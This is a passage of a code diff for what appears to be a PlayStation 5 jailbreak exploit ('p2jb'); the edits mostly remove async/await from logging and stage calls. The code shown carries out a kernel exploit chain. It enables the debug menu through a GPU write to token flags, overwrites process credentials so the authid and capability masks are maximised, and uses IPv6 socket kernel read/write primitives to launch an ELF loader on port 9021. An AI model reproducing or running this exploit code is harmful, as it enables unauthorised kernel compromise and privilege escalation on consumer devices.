-                await gpu.write_byte(utoken_flags_addr, utoken_flags | 0x1n);
-                const utoken_flags_after = await kernel.read_byte(utoken_flags_addr);
-                await ulog("  utoken_flags after:  " + toHex(utoken_flags_after));
+                const utoken_flags = kernel.read_byte(utoken_flags_addr);
+                ulog("  utoken_flags before: " + toHex(utoken_flags));
+                gpu.write_byte(utoken_flags_addr, utoken_flags | 0x1n);
+                const utoken_flags_after = kernel.read_byte(utoken_flags_addr);
+                ulog("  utoken_flags after:  " + toHex(utoken_flags_after));
 
-                await ulog("stage_debug: debug menu enabled");
+                ulog("stage_debug: debug menu enabled");
             } catch (e) {
-                await ulog("stage_debug: failed: " + e.message +
+                ulog("stage_debug: failed: " + e.message +
                     " (jailbreak unaffected)");
             }
         }
 
-        async function stage7(S) {
+        function stage7(S) {
             send_notification("Stage 7\nFinalize: authid + caps");
 
             S.kwrite64(S.proc_ucred + S.OFF.UCRED_CR_SCEAUTHID, SYSTEM_AUTHID);
             S.kwrite64(S.proc_ucred + S.OFF.UCRED_CR_SCECAPS0, 0xFFFFFFFFFFFFFFFFn);
             S.kwrite64(S.proc_ucred + S.OFF.UCRED_CR_SCECAPS1, 0xFFFFFFFFFFFFFFFFn);
 
-            await ulog("stage7: jailbreak complete; authid+caps maximized");
+            ulog("stage7: jailbreak complete; authid+caps maximized");
             send_notification(p2jb_version + "\nFW=" + FW_VERSION + "\nJailbroken");
 
-            await ulog("stage7: 'Jailbroken' notification sent -> stage_load_elf");
+            ulog("stage7: 'Jailbroken' notification sent -> stage_load_elf");
 
         }
 
-        async function stage_load_elf(S) {
+        function stage_load_elf(S) {
 
-            await ulog("stage_elfldr: entered");
+            ulog("stage_elfldr: entered");
             if (!LAUNCH_ELF_LOADER) {
-                await ulog("stage_elfldr: LAUNCH_ELF_LOADER=false - skipped");
+                ulog("stage_elfldr: LAUNCH_ELF_LOADER=false - skipped");
                 return;
             }
             if (!S.data_base_ok) {
-                await ulog("stage_elfldr: kernel data_base not resolved/verified " +
+                ulog("stage_elfldr: kernel data_base not resolved/verified " +
                     "in stage6 - elf loader skipped");
                 send_notification("Stage 7\nelf loader skipped (no data_base)");
                 return;
@@ -3206,13 +3248,13 @@ function spawn_thread(fake_rop_race1_array) {
                 if (typeof elf_parse !== "function" || typeof elf_run !== "function" ||
                     typeof elf_wait_for_exit !== "function" ||
                     typeof ipv6_kernel_rw === "undefined") {
-                    await ulog("stage_elfldr: framework elf_parse/elf_run/" +
+                    ulog("stage_elfldr: framework elf_parse/elf_run/" +
                         "elf_wait_for_exit/ipv6_kernel_rw not in scope - skipped");
                     send_notification("Stage 7\nelf loader unavailable - skipped");
                     return;
                 }
 
-                await ulog("stage_elfldr: scanning /mnt/usb0..7 for elfldr...");
+                ulog("stage_elfldr: scanning /mnt/usb0..7 for elfldr...");
                 const usb_names = ["elfldr_1320.elf", "elfldr.elf"];
                 let elf_path = null;
                 for (let u = 0; u < 8 && !elf_path; u++) {
@@ -3222,16 +3264,16 @@ function spawn_thread(fake_rop_race1_array) {
                     }
                 }
                 if (!elf_path) {
-                    await ulog("stage_elfldr: elfldr not found on /mnt/usb0../usb7");
+                    ulog("stage_elfldr: elfldr not found on /mnt/usb0../usb7");
                     send_notification("Stage 7\nelfldr_1320.elf NOT FOUND on USB\n" +
                         "(plug a FAT32/exFAT USB with elfldr_1320.elf)");
                     return;
                 }
-                await ulog("stage_elfldr: found " + elf_path);
+                ulog("stage_elfldr: found " + elf_path);
 
                 ipv6_kernel_rw.init(S.fd_ofiles, S.kread64, S.kwrite64);
                 kernel.addr.data_base = S.data_base;
-                await ulog("stage_elfldr: ipv6_kernel_rw built (master_sock=" +
+                ulog("stage_elfldr: ipv6_kernel_rw built (master_sock=" +
                     ipv6_kernel_rw.data.master_sock + " victim_sock=" +
                     ipv6_kernel_rw.data.victim_sock + ")");
 
@@ -3254,25 +3296,25 @@ function spawn_thread(fake_rop_race1_array) {
                 };
                 pin_pipe_fd(ipv6_kernel_rw.data.pipe_read_fd);
                 pin_pipe_fd(ipv6_kernel_rw.data.pipe_write_fd);
-                await ulog("stage_elfldr: handoff pipe + sockets pinned");
+                ulog("stage_elfldr: handoff pipe + sockets pinned");
 
                 const elf_data = read_file(elf_path);
-                await ulog("stage_elfldr: read " + elf_data.length +
+                ulog("stage_elfldr: read " + elf_data.length +
                     " bytes; parsing...");
-                const entry = await elf_parse(elf_data);
-                await ulog("stage_elfldr: elf entry=" + toHex(entry) +
+                const entry = elf_parse(elf_data);
+                ulog("stage_elfldr: elf entry=" + toHex(entry) +
                     "; spawning elfldr...");
-                const { thr_handle, payloadout } = await elf_run(entry, elf_path);
+                const { thr_handle, payloadout } = elf_run(entry, elf_path);
 
-                await ulog("stage_elfldr: elfldr spawned - joining...");
-                await elf_wait_for_exit(thr_handle, payloadout);
+                ulog("stage_elfldr: elfldr spawned - joining...");
+                elf_wait_for_exit(thr_handle, payloadout);
                 const out = read32_uncompressed(payloadout);
-                await ulog("stage_elfldr: Thrd join done, payloadout = " + toHex(out));
-                await ulog("stage_elfldr: daemon should be listening on :9021");
+                ulog("stage_elfldr: Thrd join done, payloadout = " + toHex(out));
+                ulog("stage_elfldr: daemon should be listening on :9021");
                 send_notification("Stage 7\nelfldr running - send your ELF to\n" +
                     "<ps5-ip>:9021  (e.g. BD-UN-JB unpatcher)");
             } catch (e) {
-                await ulog("stage_elfldr: failed: " + e.message);
+                ulog("stage_elfldr: failed: " + e.message);
                 send_notification("Stage 7\nelfldr failed: " + e.message +
                     "\n(jailbreak still complete)");
             }
@@ -3296,7 +3338,7 @@ function spawn_thread(fake_rop_race1_array) {
 
         FW_VERSION = get_fwversion();
 
-        await ulog("FW: " + FW_VERSION);
+        ulog(p2jb_version +" FW: " + FW_VERSION);
 
         ensure_kernel_offset();
 
@@ -3309,7 +3351,7 @@ function spawn_thread(fake_rop_race1_array) {
         setup_uio_buffers(S);
         setup_pipes_kernrw(S);
 
-        await ulog("pipes master=" + S.master_rfd + "," + S.master_wfd +
+        ulog("pipes master=" + S.master_rfd + "," + S.master_wfd +
             " victim=" + S.victim_rfd + "," + S.victim_wfd);
 
         /*const MAX_MASTER_RFD = 34;
@@ -3320,23 +3362,23 @@ function spawn_thread(fake_rop_race1_array) {
                 "restart YouTube, wait longer, retry. Kernel UNTOUCHED.");
         }*/
 
-        await ulog("spawning workers")
+        ulog("spawning workers")
         setup_workers(S);
         setup_ipv6_spray(S);
         apply_main_thread_pinning(S);
 
-        await ulog("host OK - starting ~2 hour leak; no further log output " +
+        ulog("host OK - starting ~40 min leak; no further log output " +
             "until stage 0 (this is normal, do not interrupt)");
 
-        await prepare_fds(S);
-        await stage0(S);
+        prepare_fds(S);
+        stage0(S);
 
         let s123_ok = false;
         for (let r = 1; r <= 8 && !s123_ok; r++) {
             try {
-                await stage1(S);
-                await stage2(S);
-                await stage3(S);
+                stage1(S);
+                stage2(S);
+                stage3(S);
                 s123_ok = true;
             } catch (e) {
                 if (r < 8) {
@@ -3347,17 +3389,17 @@ function spawn_thread(fake_rop_race1_array) {
         }
         if (!s123_ok) fail("stages 1-3 failed after 8 attempts");
 
-        await stage4(S);
-        await stage5(S);
+        stage4(S);
+        stage5(S);
 
-        await stage6(S);
-        await stage7(S);
-        await stage_load_elf(S);
+        stage6(S);
+        stage7(S);
+        stage_load_elf(S);
 
-        await ulog("=== p2jb complete ===");
+        ulog("=== p2jb complete ===");
 
     } catch (e) {
-        try { await log("p2jb FATAL: " + e.message); } catch (_) { }
+        try { log("p2jb FATAL: " + e.message); } catch (_) { }
         try { send_notification("p2jb FAILED: " + e.message); } catch (_) { }
     }
 })();
